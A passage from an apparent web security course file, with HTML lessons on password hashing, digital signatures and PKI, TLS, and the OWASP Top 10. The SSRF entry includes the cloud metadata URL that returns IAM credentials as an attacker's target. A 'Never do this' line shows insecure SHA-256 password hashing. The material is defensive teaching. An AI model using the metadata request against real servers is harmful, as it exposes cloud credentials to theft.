<p><strong>bcrypt</strong> — A widely-used password hash function with a tunable cost factor. Automatically generates and stores a random salt. A cost factor of 12 means 2¹² = 4,096 iterations internally. As hardware gets faster, you increase the cost factor. Used in Node.js (bcryptjs library), Rails, Django. A bcrypt hash looks like: <code>$2b$12$[22-char-salt][31-char-hash]</code></p>
<p><strong>scrypt</strong> — Designed to be both time-hard and memory-hard (requires a lot of RAM), defeating GPU and ASIC attacks. Used in many cryptocurrency key derivation schemes.</p>
<p><strong>Argon2</strong> — Winner of the 2015 Password Hashing Competition. Three variants: Argon2d (fastest, GPU-resistant), Argon2i (side-channel resistant), Argon2id (hybrid, recommended). The current best practice for new applications. Provides tunable time cost, memory cost, and parallelism.</p>
<p><strong>Salting:</strong> Always add a random unique salt (at least 16 bytes) per password before hashing. The salt is stored alongside the hash (it is not secret). The salt ensures that two users with the same password get different hashes, defeating rainbow tables and bulk cracking.</p>

<h5 class="content-heading">Merkle Trees</h5>
<p>A <strong>Merkle tree</strong> is a binary tree where each leaf node contains the hash of a data block, and each non-leaf node contains the hash of its two children. The single hash at the root (the <strong>Merkle root</strong>) cryptographically commits to the entire dataset. Changing any single leaf changes the root hash. Crucially, you can prove any specific piece of data is in the tree with only O(log n) hashes — called a <strong>Merkle proof</strong>. Used in: Bitcoin (transactions in a block), Git (commit objects), TLS Certificate Transparency logs.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Hash function:</strong> A deterministic, one-way function producing a fixed-size digest from any input.</li>
<li><strong>Digest / Hash:</strong> The fixed-size output of a hash function — e.g., SHA-256 always outputs exactly 256 bits (64 hex chars).</li>
<li><strong>Pre-image resistance:</strong> Given H, infeasible to find M such that hash(M) = H.</li>
<li><strong>Collision resistance:</strong> Infeasible to find any two distinct inputs with the same hash.</li>
<li><strong>Avalanche effect:</strong> A single bit change in input changes ~50% of the output bits.</li>
<li><strong>MD5:</strong> Broken — practical collisions in seconds. Never use for security purposes.</li>
<li><strong>SHA-1:</strong> Broken — SHAttered collision attack demonstrated in 2017. Deprecated everywhere.</li>
<li><strong>SHA-256:</strong> Current standard — secure, 256-bit output, widely supported. Default choice.</li>
<li><strong>SHA-3 / Keccak:</strong> Sponge construction — structurally different from SHA-2, a safe alternative.</li>
<li><strong>HMAC:</strong> Keyed hash function providing both integrity and authentication. HMAC-SHA256 is standard.</li>
<li><strong>Rainbow table:</strong> Precomputed table of password→hash mappings used to crack unsalted password databases.</li>
<li><strong>Salt:</strong> A random unique value added to each password before hashing — defeats rainbow tables.</li>
<li><strong>bcrypt:</strong> Slow, salt-generating password hash with tunable cost factor. Minimum recommended cost: 12.</li>
<li><strong>Argon2id:</strong> Current best-practice password hashing — memory-hard, time-hard, side-channel resistant.</li>
<li><strong>Merkle tree:</strong> A hash tree where the root commits to the entire dataset; enables efficient proofs of inclusion.</li>
</ul>

<h5 class="content-heading">Password Storage — The Right Way in Code</h5>
<p>Here is the correct pattern for storing and verifying passwords in a Node.js application:</p>
<p><strong>Registration:</strong> <code>const hash = await bcrypt.hash(password, 12);</code> — bcrypt automatically generates a random salt and embeds it in the hash string. Store the entire hash string in your database.</p>
<p><strong>Login verification:</strong> <code>const match = await bcrypt.compare(inputPassword, storedHash);</code> — bcrypt extracts the salt from the stored hash, re-hashes the input with the same salt, and compares in constant time.</p>
<p>The resulting hash looks like: <code>$2b$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW</code> — the <code>$2b$</code> identifies the algorithm, <code>$12$</code> is the cost factor (2¹² iterations), followed by 22 characters of base64-encoded salt and 31 characters of the hash. Everything needed to verify the password is in that one string.</p>
<p><strong>Never do this:</strong> <code>const hash = crypto.createHash('sha256').update(password).digest('hex');</code> — Even with a manual salt appended, SHA-256 is too fast. A modern GPU can compute 10 billion SHA-256 hashes per second, making brute-force practical for any common password.</p>

<h5 class="content-heading">Where Hashes Appear in Real Systems</h5>
<p><strong>Git version control:</strong> Every commit, tree, blob, and tag object in a Git repository is identified by its SHA-1 hash (being migrated to SHA-256). The commit hash is essentially a fingerprint of the entire project history at that point — any change to any file in history changes all subsequent commit hashes.</p>
<p><strong>Bitcoin blockchain:</strong> Each block header contains the SHA-256 hash of the previous block, creating a chain. Mining requires finding a nonce that makes the block header hash start with a certain number of zeros — this is "proof of work". The difficulty of this task is what secures the blockchain.</p>
<p><strong>Software distribution:</strong> When you download a package from npm, pip, or apt, the package manager verifies its SHA-256 hash against the registry's expected value before installation — ensuring the package was not tampered with in transit or on the mirror server.</p>`,

  5: `
<p>A <strong>digital signature</strong> is the cryptographic equivalent of a handwritten signature — but mathematically stronger and impossible to forge without the private key. It proves two things simultaneously: (1) the message came from the claimed sender (authentication), and (2) the message has not been altered since it was signed (integrity). Unlike a handwritten signature that looks the same regardless of what document it is on, a digital signature is cryptographically bound to the exact bytes of the signed content — change a single character and the signature is immediately invalid.</p>
<p>Digital signatures are everywhere: TLS certificates are digitally signed by Certificate Authorities. Every npm package is signed. Every Git commit can be GPG-signed. Software updates are signed so your OS only installs authentic updates. DocuSign and legal e-signature platforms use them. Understanding how they work lets you use them correctly and understand what trust guarantees they actually provide.</p>

<h5 class="content-heading">How Digital Signatures Work — Step by Step</h5>
<p><strong>Signing (done by the sender):</strong></p>
<ul class="content-list">
<li>Compute a cryptographic hash of the document: <code>H = SHA-256(document)</code></li>
<li>Encrypt the hash with your <em>private key</em>: <code>Signature = RSA_private_key(H)</code> — or in ECC: use ECDSA to produce a (r, s) signature pair from the hash.</li>
<li>Send the document + the signature together.</li>
</ul>
<p><strong>Verification (done by the recipient):</strong></p>
<ul class="content-list">
<li>Recompute the hash of the received document: <code>H' = SHA-256(document)</code></li>
<li>Decrypt the signature with the sender's <em>public key</em>: <code>H = RSA_public_key(Signature)</code></li>
<li>If H == H', the signature is valid — the document came from the key's owner and was not altered.</li>
</ul>
<p>Note: only the hash is signed (not the full document), keeping signatures small regardless of document size. The public key does the verification, not the private key — so anyone can verify a signature, but only the private key holder can create one.</p>

<h5 class="content-heading">Signature Algorithms</h5>
<p><strong>RSA-PSS (Probabilistic Signature Scheme)</strong> — RSA-based signatures with randomised padding. PSS is the modern, secure version. (RSA-PKCS1 v1.5 signatures are the legacy version — still used widely but has theoretical vulnerabilities. Always prefer PSS for new systems.)</p>
<p><strong>ECDSA (Elliptic Curve Digital Signature Algorithm)</strong> — The ECC-based signature scheme. Used in TLS certificates, Bitcoin transactions, JWT tokens (ES256 = ECDSA with P-256 + SHA-256). Critical implementation note: ECDSA requires a cryptographically random nonce k for each signature. If the same k is ever reused for two different messages, an attacker can calculate the private key. Sony's PlayStation 3 was broken this way — they used a constant k instead of a random one.</p>
<p><strong>EdDSA (Edwards-curve Digital Signature Algorithm)</strong> — Specifically Ed25519 (using Curve25519). Deterministic — the nonce k is derived from the private key and message hash, so there is no catastrophic failure from a bad RNG. Fast, simple to implement correctly. Recommended for new systems. Used in SSH (ed25519 keys), Signal, WireGuard, and TLS 1.3.</p>

<h5 class="content-heading">X.509 Certificates — What They Are</h5>
<p>A <strong>certificate</strong> is a digitally signed document that binds a public key to an identity. It answers the question: "I have this public key — but how do I know it actually belongs to google.com and not an attacker?" The certificate contains:</p>
<ul class="content-list">
<li><strong>Subject:</strong> The entity the certificate belongs to (e.g., Common Name: google.com, Organisation: Google LLC).</li>
<li><strong>Public key:</strong> The subject's public key.</li>
<li><strong>Validity period:</strong> Not Before and Not After dates (typically 1–2 years for public web certs).</li>
<li><strong>Issuer:</strong> The Certificate Authority that signed this certificate.</li>
<li><strong>Subject Alternative Names (SANs):</strong> Additional domain names / IP addresses this cert is valid for.</li>
<li><strong>Serial number:</strong> Unique identifier for this certificate within the issuing CA.</li>
<li><strong>Signature:</strong> The CA's digital signature over all the above fields.</li>
</ul>
<p>X.509 is the international standard format (used by HTTPS, S/MIME, code signing, VPNs). Certificates are encoded in PEM format (Base64 between -----BEGIN CERTIFICATE----- headers) or DER format (binary). View any certificate by clicking the padlock in your browser and inspecting details.</p>

<h5 class="content-heading">Certificate Authorities and the Chain of Trust</h5>
<p>A <strong>Certificate Authority (CA)</strong> is a trusted organisation that verifies an applicant's identity and then signs a certificate for them. Your operating system and browser ship with a pre-installed list of ~150 trusted <strong>Root CAs</strong> (DigiCert, Sectigo, Let's Encrypt, GlobalSign, etc.). These root certificates are what you ultimately trust.</p>
<p>In practice, root CAs don't sign end-entity certificates directly. They sign <strong>Intermediate CA certificates</strong>, which sign the end-entity certificates. This creates a <strong>certificate chain</strong>: End-entity cert ← signed by → Intermediate CA ← signed by → Root CA. Keeping the root CA offline in an air-gapped facility (Hardware Security Module) protects it — if an intermediate CA is compromised, it can be revoked without revoking the root.</p>
<p><strong>Validation types:</strong></p>
<ul class="content-list">
<li><strong>DV (Domain Validation):</strong> CA verifies you control the domain (via DNS record or file upload). Automated, free via Let's Encrypt. The green padlock shows DV.</li>
<li><strong>OV (Organisation Validation):</strong> CA verifies domain control + legal identity of the organisation. More expensive, takes days.</li>
<li><strong>EV (Extended Validation):</strong> Strictest verification — physical address, legal status, business identity. Used to show the green company name bar in browsers (now removed in modern browsers in favour of padlock-only).</li>
</ul>

<h5 class="content-heading">Certificate Revocation</h5>
<p>What happens when a certificate's private key is compromised before the certificate expires? The certificate must be <strong>revoked</strong>. There are two mechanisms:</p>
<p><strong>CRL (Certificate Revocation List):</strong> A CA-published list of revoked certificate serial numbers. Browsers periodically download this list and check it. Problem: lists can be large, update infrequently, and browsers may use stale cached versions.</p>
<p><strong>OCSP (Online Certificate Status Protocol):</strong> A client queries the CA in real-time: "Is certificate serial number X still valid?" The CA responds "good", "revoked", or "unknown". Problem: this adds latency and reveals browsing behaviour to the CA.</p>
<p><strong>OCSP Stapling:</strong> The server fetches its own OCSP response from the CA, caches it, and includes it ("staples" it) in the TLS handshake. Eliminates the privacy problem and latency — the client gets a fresh revocation status without querying the CA directly.</p>
<p><strong>Certificate Transparency (CT):</strong> All public TLS certificates must be logged in public, append-only CT logs. Browsers require proof of CT logging. This means if a CA fraudulently issues a certificate for google.com, Google will detect it by monitoring CT logs. Many major incidents (DigiNotar, CNNIC) led to this requirement.</p>

<h5 class="content-heading">Public Key Infrastructure (PKI)</h5>
<p>PKI is the entire ecosystem of policies, procedures, hardware, software, and people needed to create, manage, distribute, store, and revoke digital certificates. PKI is what enables HTTPS to be trusted at scale — billions of websites secured by a handful of root CAs that everyone has implicitly agreed to trust.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>Digital signature:</strong> Hash of data signed with a private key — proves origin and integrity.</li>
<li><strong>Signing:</strong> Private key operation — produces the signature from the data's hash.</li>
<li><strong>Verification:</strong> Public key operation — confirms the signature matches the data.</li>
<li><strong>RSA-PSS:</strong> Modern RSA signature scheme with randomised padding — use instead of legacy PKCS1 v1.5.</li>
<li><strong>ECDSA:</strong> ECC-based signatures — small, fast, used in TLS/JWT. Fatal if nonce k is reused.</li>
<li><strong>EdDSA / Ed25519:</strong> Deterministic ECC signatures — safe nonce derivation, fast, recommended for new systems.</li>
<li><strong>X.509 certificate:</strong> Standard format binding a public key to an identity — used in HTTPS, S/MIME, VPNs.</li>
<li><strong>Certificate Authority (CA):</strong> Trusted entity that verifies identity and signs certificates.</li>
<li><strong>Root CA:</strong> Self-signed CA at the top of the trust chain — stored in your OS/browser trust store.</li>
<li><strong>Intermediate CA:</strong> Signed by the root CA; signs end-entity certs — root stays offline for safety.</li>
<li><strong>Certificate chain:</strong> End-entity → Intermediate → Root — each signed by the one above it.</li>
<li><strong>DV / OV / EV:</strong> Domain, Organisation, Extended Validation — levels of identity verification during issuance.</li>
<li><strong>Let's Encrypt:</strong> Free, automated DV CA — revolutionised HTTPS adoption by making certs free and auto-renewable.</li>
<li><strong>CRL:</strong> Certificate Revocation List — CA-published list of revoked serial numbers.</li>
<li><strong>OCSP:</strong> Online Certificate Status Protocol — real-time cert validity query.</li>
<li><strong>OCSP Stapling:</strong> Server includes its own OCSP response in the TLS handshake — no client CA query needed.</li>
<li><strong>Certificate Transparency:</strong> Mandatory public logging of all TLS certs — enables detection of mis-issuance.</li>
<li><strong>PKI:</strong> The full ecosystem managing digital certificates and public keys at scale.</li>
</ul>

<h5 class="content-heading">How to Read a Real Certificate</h5>
<p>You can inspect any HTTPS certificate right now. In Chrome, click the padlock → "Connection is secure" → "Certificate is valid". Here is what you will see for a typical site:</p>
<p><strong>Subject:</strong> The domain this cert was issued for (e.g., <code>CN=*.google.com</code>). The <code>*</code> is a wildcard — covers all immediate subdomains (mail.google.com, maps.google.com) but not sub-subdomains (a.b.google.com).</p>
<p><strong>Issued by:</strong> The intermediate CA that signed it (e.g., <code>GTS CA 1C3</code>). Further up the chain: <code>GTS Root R1</code> — Google's root CA, which is in your browser's built-in trust store.</p>
<p><strong>Valid from / to:</strong> Modern certs are typically 90 days (Let's Encrypt) to 1 year. Shorter validity means compromised certs expire sooner. Let's Encrypt's 90-day policy, with automated ACME renewal, is now considered best practice.</p>
<p><strong>Subject Alternative Names:</strong> Lists every domain this cert is valid for — typically dozens of subdomains for large sites like Google.</p>
<p><strong>Signature algorithm:</strong> Should be <code>SHA256withRSA</code> or <code>ecdsa-with-SHA256</code>. If you see MD5 or SHA1, the cert is dangerously outdated.</p>
<p>Try this yourself on any HTTPS website — reading real certificates solidifies understanding of PKI concepts far better than any description.</p>

<h5 class="content-heading">Why Certificate Transparency Changed Everything</h5>
<p>Before Certificate Transparency (CT), Certificate Authorities could secretly issue certificates for any domain — and this happened. In 2011, the Dutch CA DigiNotar was compromised and issued fraudulent certificates for google.com, yahoo.com, and CIA.gov. Iran used these to intercept traffic from 300,000 Iranian users. Google only discovered it because Chrome had hardcoded pins for Google's certificates. CT logs, now mandatory, mean every certificate issued anywhere is publicly logged within hours — any mis-issuance is detectable by the domain owner monitoring their own CT log entries.</p>`,

  6: `
<p><strong>TLS (Transport Layer Security)</strong> is the protocol that secures HTTPS, email over SMTP/IMAP, database connections, VoIP, and most other sensitive network communications. Every padlock in your browser represents a TLS session. TLS is not just one algorithm — it is a framework that combines asymmetric cryptography (to establish a shared key), symmetric cryptography (to encrypt the actual data), and hash functions (for integrity). Understanding TLS means understanding how all the cryptographic concepts from previous modules come together in one protocol that billions of people use every day.</p>
<p>TLS has a troubled history of vulnerabilities — BEAST, CRIME, POODLE, Heartbleed, ROBOT — each teaching the security community important lessons about protocol design. TLS 1.3 represents the distilled wisdom of these lessons: every weakness from previous versions has been removed, and the result is both faster and more secure.</p>

<h5 class="content-heading">TLS 1.2 Handshake — How It Works</h5>
<p>TLS 1.2 (2008) requires 2 round trips before the first byte of application data can flow:</p>
<ul class="content-list">
<li><strong>ClientHello:</strong> Client sends supported TLS versions, a random nonce (client_random), and a list of supported cipher suites (e.g., TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384).</li>
<li><strong>ServerHello:</strong> Server picks the best cipher suite, sends server_random, and its certificate.</li>
<li><strong>Key Exchange:</strong> Client verifies the certificate chain. Both sides use ECDHE to generate a shared pre-master secret. Both derive the session keys from client_random + server_random + pre-master secret using a PRF (pseudo-random function).</li>
<li><strong>Finished:</strong> Both sides send a "Finished" message — a hash of the entire handshake — to verify nothing was tampered with. After this, all data is encrypted with symmetric session keys.</li>
</ul>

<h5 class="content-heading">TLS 1.3 — The Modern Standard</h5>
<p>TLS 1.3 (2018) is a major redesign. It is simultaneously faster and more secure:</p>
<ul class="content-list">
<li><strong>1-RTT handshake:</strong> Reduced from 2 round trips to 1. The client sends its key share (ECDHE public key) in the very first message alongside the ClientHello. The server can respond with encrypted data in its first reply. Result: 66ms vs 100ms on a typical network connection.</li>
<li><strong>0-RTT resumption:</strong> For reconnecting clients (within 24 hours), TLS 1.3 can resume a session with zero round trips — the client sends application data with the very first packet. Trade-off: 0-RTT data is replay-vulnerable (an attacker can replay those first bytes). Only use for non-sensitive idempotent operations (GET requests, not payments).</li>
<li><strong>Removed all legacy cruft:</strong> Static RSA key exchange (no PFS), RC4, DES, 3DES, MD5, SHA-1, export-grade ciphers, and renegotiation were all removed. TLS 1.3 only supports 5 cipher suites, all providing AEAD and PFS.</li>
<li><strong>Encrypted handshake:</strong> In TLS 1.3, the server's certificate is encrypted during the handshake (using ephemeral keys) — an eavesdropper cannot see which certificate the server sent. In TLS 1.2, the certificate was in plaintext.</li>
</ul>

<h5 class="content-heading">Cipher Suites — Reading and Choosing Them</h5>
<p>A cipher suite specifies the algorithms used for each cryptographic operation in a TLS session. TLS 1.2 cipher suite name format:</p>
<p><code>TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384</code></p>
<ul class="content-list">
<li><strong>ECDHE:</strong> Key exchange algorithm (Elliptic Curve Diffie-Hellman Ephemeral) — provides PFS.</li>
<li><strong>RSA:</strong> Authentication method — how the server's identity is verified (using its RSA certificate).</li>
<li><strong>AES_256_GCM:</strong> Symmetric encryption (AES-256 in GCM mode) — bulk data encryption.</li>
<li><strong>SHA384:</strong> PRF / MAC hash function for key derivation and record MAC.</li>
</ul>
<p>TLS 1.3 simplified cipher suites to just the AEAD algorithm + hash: <code>TLS_AES_256_GCM_SHA384</code>, <code>TLS_CHACHA20_POLY1305_SHA256</code>. Key exchange and authentication are handled separately. All 5 TLS 1.3 cipher suites provide PFS.</p>

<h5 class="content-heading">Perfect Forward Secrecy (PFS) — Why It Matters</h5>
<p>In older TLS (with static RSA key exchange), the client encrypts the pre-master secret with the server's RSA public key. If an attacker records encrypted traffic today and later compromises the server's private RSA key (data breach, court order, years-long passive attack), they can decrypt all previously recorded sessions retroactively — including sessions from years ago.</p>
<p>With <strong>Perfect Forward Secrecy</strong> (using DHE or ECDHE), fresh ephemeral key pairs are generated for every session. The session keys are derived from these ephemeral keys. After the session ends, the ephemeral private keys are deleted. Even with the server's long-term private key compromised, an attacker cannot reconstruct past session keys because the ephemeral keys are gone. Always verify ECDHE appears in the cipher suite.</p>

<h5 class="content-heading">SNI and Certificate Selection</h5>
<p><strong>SNI (Server Name Indication)</strong> is a TLS extension where the client includes the domain name it is connecting to in the ClientHello message (before encryption). This allows a single server/IP address to host multiple TLS certificates for different domains — essential for shared hosting. Without SNI, a server with one IP could only serve one TLS certificate. Note: in TLS 1.2, SNI is plaintext (an eavesdropper can see what domain you're connecting to, even if not the content). TLS 1.3 with <strong>Encrypted Client Hello (ECH)</strong> encrypts SNI — a newer development still being deployed.</p>

<h5 class="content-heading">Historic TLS Attacks — Learn From Them</h5>
<p><strong>BEAST (2011):</strong> Exploited CBC mode's predictable IV in TLS 1.0, allowing session cookie decryption. Fixed by upgrading to TLS 1.1/1.2 and preferring RC4 (now also broken). Real fix: use AES-GCM.</p>
<p><strong>CRIME / BREACH (2012):</strong> Exploited TLS compression — an attacker could adaptively guess secret cookie values by observing compressed ciphertext length. Fix: disable TLS compression (it was removed in TLS 1.3).</p>
<p><strong>POODLE (2014):</strong> Exploited padding oracle vulnerability in SSL 3.0 CBC mode. Fix: disable SSL 3.0 entirely. Extended to TLS 1.0/1.1 CBC — another reason to disable them.</p>
<p><strong>Heartbleed (2014):</strong> Not a TLS protocol flaw — a buffer over-read bug in OpenSSL's heartbeat extension. Allowed any remote attacker to read 64KB of the server's memory per request, potentially exposing private keys, session tokens, and plaintext data. Affected ~17% of all HTTPS servers at the time. Fix: patch OpenSSL and regenerate all affected keys/certificates.</p>
<p><strong>ROBOT (2017):</strong> Return Of Bleichenbacher's Oracle Threat. A padding oracle attack against RSA-PKCS1 v1.5 key exchange (not ECDHE). Allowed decryption of TLS sessions and forging of signatures for servers using static RSA key exchange. Fix: use ECDHE (PFS) cipher suites, eliminating static RSA key exchange entirely. TLS 1.3 removes static RSA key exchange completely.</p>

<h5 class="content-heading">HSTS — HTTP Strict Transport Security</h5>
<p>HSTS is an HTTP response header that tells the browser: "For the next [max-age] seconds, only access this domain over HTTPS — never plain HTTP, even if the user types http://." The header: <code>Strict-Transport-Security: max-age=31536000; includeSubDomains; preload</code>. HSTS prevents SSL stripping attacks (where an attacker silently downgrades HTTPS to HTTP). The HSTS preload list (built into all major browsers) ensures even first-visit connections are forced to HTTPS.</p>

<h5 class="content-heading">The Ten Most Critical Applied Cryptography Mistakes</h5>
<ul class="content-list">
<li><strong>1. Hardcoding keys/secrets in source code</strong> — They end up in git history forever. Use environment variables.</li>
<li><strong>2. Using ECB mode</strong> — Leaks patterns. Use GCM.</li>
<li><strong>3. Reusing nonces/IVs</strong> — Catastrophic in CTR and GCM modes. Generate random IVs for every encryption.</li>
<li><strong>4. Storing passwords with SHA-256 or MD5</strong> — Use bcrypt, scrypt, or Argon2id.</li>
<li><strong>5. Skipping certificate validation</strong> — Never set <code>verify=False</code> or ignore cert errors. This defeats TLS entirely.</li>
<li><strong>6. Using static RSA key exchange without PFS</strong> — All past sessions can be decrypted if the key is compromised.</li>
<li><strong>7. Writing your own cryptographic code</strong> — Use audited libraries: libsodium, Bouncy Castle, OpenSSL. Crypto is easy to get subtly wrong in ways that are undetectable but completely insecure.</li>
<li><strong>8. Using MD5 or SHA-1 for digital signatures or certificates</strong> — Broken. Use SHA-256 minimum.</li>
<li><strong>9. Short RSA keys (< 2048 bits)</strong> — 1024-bit RSA can be factored. Use 2048-bit minimum, 4096-bit for long-term keys.</li>
<li><strong>10. Allowing TLS 1.0 / SSL 3.0</strong> — Vulnerable to POODLE, BEAST. Disable; require TLS 1.2 minimum, TLS 1.3 preferred.</li>
</ul>

<h5 class="content-heading">Post-Quantum Cryptography — The Coming Transition</h5>
<p>A sufficiently powerful <strong>quantum computer</strong> running <strong>Shor's algorithm</strong> could factor large integers and solve the discrete logarithm problem in polynomial time — completely breaking RSA, ECC, and Diffie-Hellman. Symmetric ciphers (AES-256) and hash functions (SHA-256) are quantum-resistant (Grover's algorithm halves security — AES-128 drops to 64-bit effective security, but AES-256 remains at 128-bit, which is acceptable).</p>
<p>NIST completed its post-quantum cryptography standardisation in 2024. The new standards include: <strong>ML-KEM (CRYSTALS-Kyber)</strong> for key encapsulation, and <strong>ML-DSA (CRYSTALS-Dilithium)</strong> for digital signatures — both based on lattice problems that quantum computers cannot solve efficiently. Migration to post-quantum algorithms is already beginning in TLS, government systems, and cloud infrastructure. Harvest-now-decrypt-later attacks (recording today's encrypted traffic to decrypt once quantum computers exist) make this transition urgent for long-lived secrets.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>TLS (Transport Layer Security):</strong> The protocol securing HTTPS — combines asymmetric key exchange, symmetric encryption, and MAC.</li>
<li><strong>TLS 1.3:</strong> Current standard — 1-RTT handshake, removes all legacy algorithms, encrypts certificate in handshake.</li>
<li><strong>Cipher suite:</strong> Named combination of key exchange, authentication, encryption, and MAC algorithms for a TLS session.</li>
<li><strong>ECDHE:</strong> Ephemeral Elliptic Curve Diffie-Hellman — provides Perfect Forward Secrecy in key exchange.</li>
<li><strong>Perfect Forward Secrecy (PFS):</strong> Ephemeral session keys mean past sessions cannot be decrypted even if the long-term key is later stolen.</li>
<li><strong>SNI:</strong> Server Name Indication — client sends the target domain in ClientHello, enabling virtual hosting of multiple certs.</li>
<li><strong>0-RTT resumption:</strong> TLS 1.3 feature — client sends data with first packet; only safe for idempotent requests (replay risk).</li>
<li><strong>HSTS:</strong> HTTP Strict Transport Security — browser policy forcing HTTPS for a domain for a defined period.</li>
<li><strong>Certificate pinning:</strong> Client hardcodes expected certificate or public key — protects against rogue CAs but complex to manage.</li>
<li><strong>Heartbleed:</strong> OpenSSL buffer over-read — not a TLS flaw, but a critical implementation bug exposing server memory.</li>
<li><strong>POODLE:</strong> Padding oracle attack on SSL 3.0 / TLS CBC mode — fix by disabling SSL 3.0 and TLS 1.0/1.1.</li>
<li><strong>ROBOT:</strong> Bleichenbacher padding oracle on RSA key exchange — fix by using ECDHE (PFS) only.</li>
<li><strong>Post-quantum cryptography:</strong> Algorithms resistant to quantum computers — ML-KEM (Kyber) and ML-DSA (Dilithium) are the new NIST standards.</li>
<li><strong>Shor's algorithm:</strong> Quantum algorithm that breaks RSA and ECC — motivation for post-quantum transition.</li>
</ul>`,

  // ── Course 2: Web Application Security ───────────────────────────────
  7: `<p>The <strong>OWASP Top 10</strong> is the most widely recognised list of critical web application security risks, updated every three to four years by hundreds of security professionals worldwide. It is not just educational material — it is the backbone of compliance frameworks like PCI-DSS, SOC 2, and ISO 27001. If you build web applications professionally, the Top 10 is required knowledge. A single exploited vulnerability in any of these categories can lead to data breaches affecting millions of users, regulatory fines in the tens of millions, and permanent reputational damage.</p>
<p>The 2021 edition reorganised the list into three newly named categories and promoted several long-standing issues to top positions. Understanding the <em>why</em> behind each ranking — not just the name — is what separates a developer who can write secure code from one who just ticks compliance checkboxes.</p>

<h5 class="content-heading">OWASP Top 10 — 2021 Edition, Fully Explained</h5>
<p><strong>A01 — Broken Access Control</strong> (moved from #5 to #1): 94% of applications tested had some form of access control failure. This covers horizontal privilege escalation (accessing another user's data by changing an ID parameter), vertical privilege escalation (accessing admin functions as a regular user), and missing function-level access control (API endpoints that forget to check authorisation). The fix: enforce access control server-side on every request. Never trust the client to restrict what it can access.</p>
<p><strong>A02 — Cryptographic Failures</strong> (previously "Sensitive Data Exposure"): This covers transmitting data in clear text, using broken/deprecated algorithms (MD5, SHA-1, DES, RC4), hardcoding keys in source code, improper key management, and missing encryption at rest. The rename to "Cryptographic Failures" is intentional — the root cause is the crypto layer failing, not just the data exposure symptom. Real impact: in 2013, Adobe stored 153 million passwords encrypted with 3DES in ECB mode (identical passwords produced identical ciphertext) — making the "encrypted" passwords trivially crackable.</p>
<p><strong>A03 — Injection</strong> (was #1 for a decade): SQL injection, command injection, LDAP injection, template injection. Injection happens wherever user-supplied data is sent to an interpreter that executes it as code or commands. Still responsible for massive breaches — the 2017 Equifax breach (147 million records) was triggered by an Apache Struts remote code execution vulnerability, a form of injection.</p>
<p><strong>A04 — Insecure Design</strong> (new in 2021): Unlike other categories which cover implementation flaws, this is about fundamental design weaknesses — features that were never designed to be secure. Example: a password reset flow that allows unlimited guesses at the reset code without lockout. No amount of secure implementation fixes a broken design; it must be redesigned. This is where <strong>threat modelling</strong> during architecture review catches problems before a line of code is written.</p>
<p><strong>A05 — Security Misconfiguration</strong>: Default credentials on admin panels, directory listing enabled, verbose stack traces in production, unnecessary services running, cloud storage buckets set to public read. The Capital One breach in 2019 — 100 million records — stemmed from a misconfigured WAF and over-privileged IAM role in AWS. Misconfiguration is consistently the highest-prevalence finding in penetration tests.</p>
<p><strong>A06 — Vulnerable and Outdated Components</strong>: The average enterprise application has hundreds of third-party dependencies, each a potential vulnerability source. The 2021 Log4Shell vulnerability in the Log4j library affected hundreds of millions of servers globally. 79% of the time developers do not even know what components are in their applications (shadow dependencies). Use <code>npm audit</code>, Snyk, or Dependabot to continuously scan and patch dependencies.</p>
<p><strong>A07 — Identification and Authentication Failures</strong>: Permitting weak passwords, missing account lockout (enabling credential stuffing), storing passwords in plaintext or with weak hashing (MD5), missing multi-factor authentication, exposing session tokens in URLs. The 2012 LinkedIn breach: 6.5 million password hashes stolen, nearly all cracked within days because they used unsalted SHA-1.</p>
<p><strong>A08 — Software and Data Integrity Failures</strong> (new): Applications that auto-update without verifying the integrity of the update, pipelines that pull untrusted code from unverified sources, insecure deserialization (deserializing attacker-controlled objects that trigger malicious code). The 2020 SolarWinds supply chain attack is the canonical example — malicious code was injected into a legitimate software build pipeline, affecting 18,000 organisations including the US Treasury and Pentagon.</p>
<p><strong>A09 — Security Logging and Monitoring Failures</strong>: Applications that do not log authentication failures, do not alert on suspicious patterns, store logs in formats that cannot be queried, or do not retain logs long enough. On average, a breach is undetected for 207 days. If you are not logging and monitoring, you will not know you have been breached until the attacker has already exfiltrated your data.</p>
<p><strong>A10 — Server-Side Request Forgery (SSRF)</strong> (new): The server makes an HTTP request to a URL specified by the user — and the attacker points it at internal services. In cloud environments, SSRF is devastatingly effective: a request to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/</code> returns the cloud instance's IAM credentials. The 2019 Capital One breach was enabled in part by SSRF against the AWS metadata endpoint.</p>

<h5 class="content-heading">Threat Modelling with STRIDE</h5>
<p>Threat modelling is the practice of systematically asking "what could go wrong?" before you write code. The <strong>STRIDE</strong> framework (developed at Microsoft) gives you six attack categories to check for every component of your system:</p>
<ul class="content-list">
<li><strong>Spoofing:</strong> Can an attacker pretend to be a legitimate user or service? (Mitigate: strong authentication)</li>
<li><strong>Tampering:</strong> Can data be modified in transit or storage without detection? (Mitigate: integrity checks, MACs, signed tokens)</li>
<li><strong>Repudiation:</strong> Can a user deny performing an action? (Mitigate: audit logs, digital signatures)</li>
<li><strong>Information Disclosure:</strong> Can sensitive data be read by unauthorised parties? (Mitigate: encryption, access control)</li>
<li><strong>Denial of Service:</strong> Can the service be made unavailable? (Mitigate: rate limiting, auto-scaling, caching)</li>
<li><strong>Elevation of Privilege:</strong> Can a low-privilege user gain admin access? (Mitigate: principle of least privilege, access control checks)</li>
</ul>
<p>A practical threat modelling session takes 2-4 hours for a feature, involves developers, architects, and a security engineer, and produces a list of mitigations to implement. The cost is trivial compared to fixing the same issues post-breach.</p>

<h5 class="content-heading">The Real Cost of Insecurity</h5>
<p>IBM's 2023 Cost of a Data Breach Report: the global average cost of a data breach is <strong>$4.45 million</strong>. For healthcare, it averages $10.93 million. The Equifax breach cost $700 million in settlements. British Airways was fined £20 million under GDPR for a breach affecting 400,000 customers — caused by a single Magecart skimming script injected via a third-party analytics library. Security investment ROI is asymmetric: spending $50K on security tooling and training can prevent a $4.45M breach.</p>

<h5 class="content-heading">Key Concepts</h5>
<ul class="content-list">
<li><strong>OWASP:</strong> Open Web Application Security Project — the global authority on web application security, producing the Top 10, testing guides, and security tools.</li>
